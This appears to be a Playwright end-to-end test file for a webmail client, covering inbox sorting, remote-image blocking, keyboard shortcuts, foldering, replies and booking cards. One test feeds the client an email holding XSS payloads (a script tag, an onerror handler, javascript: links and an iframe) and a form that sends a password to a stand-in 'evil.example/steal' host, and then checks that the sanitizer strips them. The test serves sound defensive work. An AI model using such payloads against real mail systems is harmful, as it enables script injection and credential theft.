// Reading and organising mail in the browser, against real mail delivered to the test mail server.
import { expect, test } from './fixtures.ts'
import { deliver, run, subjectsOnServer, syncUntil, uniqueAddress } from './helpers.ts'

// Each test sends its own mail, with a subject only it uses.
const subject = (name: string) => `${name} ${Date.now().toString(36)}`

test('sorts new mail into sections and shows a message safely, with remote images held back', async ({ page }) => {
  const lunch = subject('Lunch plans')
  const news = subject('Weekly news')
  await deliver(run().mailbox, {
    from: 'Jane Doe <jane@example.test>',
    subject: lunch,
    html: '<p>Shall we try the <b>new place</b>?</p><img src="https://tracker.example/pixel.gif" alt="">',
    attachments: [{ filename: 'menu.txt', content: 'Soup of the day' }],
  })
  await deliver(run().mailbox, {
    from: 'News <news@letters.test>',
    subject: news,
    html: '<p>Stories</p>',
    headers: { 'List-Unsubscribe': '<mailto:u@letters.test>' },
  })
  await page.goto('/mail/inbox')
  await syncUntil(page, news)

  const list = page.getByRole('region', { name: 'Inbox' })
  await expect(list.getByRole('heading', { name: /People/ })).toBeVisible()
  await expect(list.getByRole('heading', { name: /Newsletters/ })).toBeVisible()

  await list.getByRole('button', { name: new RegExp(lunch) }).click()
  await expect(page.getByRole('heading', { level: 1, name: lunch })).toBeVisible()
  const body = page.frameLocator('iframe[title="Message content"]')
  await expect(body.getByText('new place')).toBeVisible()
  await expect(page.getByText('menu.txt')).toBeVisible()

  // The tracking pixel stays blocked until asked for.
  await expect(page.getByText(/Remote images blocked/)).toBeVisible()
  await expect(body.locator('img[src^="https://tracker.example"]')).toHaveCount(0)
  await page.getByRole('button', { name: 'Load images' }).click()
  await expect(page.getByText(/Remote images blocked/)).toBeHidden()
})

test('never runs scripts from an email', async ({ page }) => {
  const evil = subject('Totally safe')
  await deliver(run().mailbox, {
    subject: evil,
    html: [
      '<p>Hello</p>',
      '<script>alert("script tag")</script>',
      '<img src="x" onerror="alert(\'onerror\')">',
      '<a href="javascript:alert(\'link\')">click me</a>',
      '<iframe src="javascript:alert(\'frame\')"></iframe>',
      '<form action="https://evil.example/steal"><input name="password"></form>',
    ].join(''),
  })
  await page.goto('/mail/inbox')
  await syncUntil(page, evil)
  await page.getByRole('button', { name: new RegExp(evil) }).click()

  const body = page.frameLocator('iframe[title="Message content"]')
  await expect(body.getByText('Hello')).toBeVisible()
  await body.getByText('click me').click()
  // The fixture fails the test if any alert() appeared; also check nothing dangerous survived sanitizing.
  await expect(body.locator('script, iframe, form, [onerror]')).toHaveCount(0)
})

test('stars, archives, marks as spam and deletes, and the mail server agrees', async ({ page }) => {
  const keep = subject('Keep this')
  const junk = subject('Cheap pills')
  const bin = subject('Old news')
  for (const s of [keep, junk, bin])
    await deliver(run().mailbox, { from: `Someone <someone-${s.length}@example.test>`, subject: s, text: 'x' })
  await page.goto('/mail/inbox')
  await syncUntil(page, bin)
  const row = (s: string) => page.getByRole('button', { name: new RegExp(s) })

  await row(keep).click()
  await page.getByRole('button', { name: 'Star', exact: true }).click()
  await page.getByRole('button', { name: 'Archive', exact: true }).click()
  await expect(row(keep)).toBeHidden()
  await page.getByRole('link', { name: /^Starred/ }).click()
  await expect(row(keep)).toBeVisible()
  await page.getByRole('link', { name: /^Archive/ }).click()
  await expect(row(keep)).toBeVisible()
  await expect.poll(() => subjectsOnServer(run().mailbox, 'Archive')).toContain(keep)

  await page.getByRole('link', { name: /^Inbox/ }).click()
  await row(junk).click()
  await page.getByRole('button', { name: 'Mark as spam' }).click()
  await expect(row(junk)).toBeHidden()
  await page.getByRole('link', { name: /^Spam/ }).click()
  await expect(row(junk)).toBeVisible()

  await page.getByRole('link', { name: /^Inbox/ }).click()
  await row(bin).click()
  await page.getByRole('button', { name: 'Delete', exact: true }).click()
  await page.getByRole('link', { name: /^Trash/ }).click()
  await expect(row(bin)).toBeVisible()
  await expect.poll(() => subjectsOnServer(run().mailbox, 'Trash')).toContain(bin)
})

test('keyboard: j/k move through the list, e archives, / searches', async ({ page }) => {
  const first = subject('Keys one')
  const second = subject('Keys two')
  // Dated a little ahead, so they sit next to each other at the top of the list.
  await deliver(run().mailbox, { subject: first, text: 'x', date: new Date(Date.now() + 60_000) })
  await deliver(run().mailbox, { subject: second, text: 'x', date: new Date(Date.now() + 120_000) })
  await page.goto('/mail/inbox')
  await syncUntil(page, second)

  await page.getByRole('button', { name: new RegExp(second) }).click()
  await expect(page.getByRole('heading', { level: 1, name: second })).toBeVisible()
  await page.keyboard.press('j')
  await expect(page.getByRole('heading', { level: 1, name: first })).toBeVisible()
  await page.keyboard.press('k')
  await expect(page.getByRole('heading', { level: 1, name: second })).toBeVisible()
  await page.keyboard.press('e')
  await expect(page.getByRole('button', { name: new RegExp(second) })).toBeHidden()

  await page.keyboard.press('/')
  await page.keyboard.type(first)
  await expect(
    page.getByRole('region', { name: 'Search' }).getByRole('button', { name: new RegExp(first) }),
  ).toBeVisible()
})

test('replies to a message, and the reply reaches the sender', async ({ page }) => {
  const friend = uniqueAddress('friend')
  const question = subject('Coffee at 3')
  await deliver(run().mailbox, {
    from: `Friend <${friend}>`,
    subject: question,
    text: 'Are you free at 3?',
    messageId: `<${Date.now()}@friend.test>`,
  })
  await page.goto('/mail/inbox')
  await syncUntil(page, question)
  await page.getByRole('button', { name: new RegExp(question) }).click()
  await page.getByRole('button', { name: 'Reply', exact: true }).click()

  const composer = page.getByRole('region', { name: `Re: ${question}` }).or(page.getByLabel('New message'))
  await expect(page.getByLabel('Subject')).toHaveValue(`Re: ${question}`)
  await expect(composer.getByText(friend)).toBeVisible()
  await page.getByLabel('Message body').click()
  await page.keyboard.type('Yes, see you then!')
  await page.getByRole('button', { name: 'Send', exact: true }).click()

  await expect.poll(() => subjectsOnServer(friend)).toEqual([`Re: ${question}`])
  await expect.poll(() => subjectsOnServer(run().mailbox, 'Sent')).toContain(`Re: ${question}`)
})

test('shows a booking as an event card, and marks mail unread or replies to everyone', async ({ page }) => {
  const trip = subject('Your flight')
  const flight = {
    '@context': 'http://schema.org',
    '@type': 'FlightReservation',
    reservationNumber: 'E2E123',
    reservationFor: {
      '@type': 'Flight',
      flightNumber: '9',
      airline: { iataCode: 'NX' },
      departureAirport: { name: 'Oslo', iataCode: 'OSL' },
      arrivalAirport: { name: 'Lisbon', iataCode: 'LIS' },
      departureTime: '2030-05-01T08:00:00Z',
      arrivalTime: '2030-05-01T12:00:00Z',
    },
  }
  const colleague = uniqueAddress('cc')
  await deliver(run().mailbox, {
    subject: trip,
    cc: colleague,
    html: `<script type="application/ld+json">${JSON.stringify(flight)}</script><p>Booked!</p>`,
  })
  await page.goto('/mail/inbox')
  await syncUntil(page, trip)
  await page.getByRole('button', { name: new RegExp(trip) }).click()

  await expect(page.getByText('NX9 Oslo → Lisbon')).toBeVisible()
  await expect(page.getByText('Booking E2E123')).toBeVisible()
  await expect(page.getByRole('link', { name: 'Download calendar file' })).toHaveAttribute('href', /event\.ics$/)

  await page.getByRole('button', { name: 'Reply all' }).click()
  await expect(
    page.getByRole('region', { name: /Re:/ }).or(page.getByLabel('New message')).getByText(colleague),
  ).toBeVisible()
  await page.getByRole('button', { name: 'Discard draft' }).click()

  await page.getByRole('button', { name: 'Mark unread' }).click()
  await expect(page.getByRole('heading', { level: 1, name: trip })).toBeHidden()
  const counts = (await (await page.request.get('/api/messages?folder=inbox')).json()) as {
    subject: string
    unread: boolean
  }[]
  expect(counts.find((m) => m.subject === trip)?.unread).toBe(true)
})
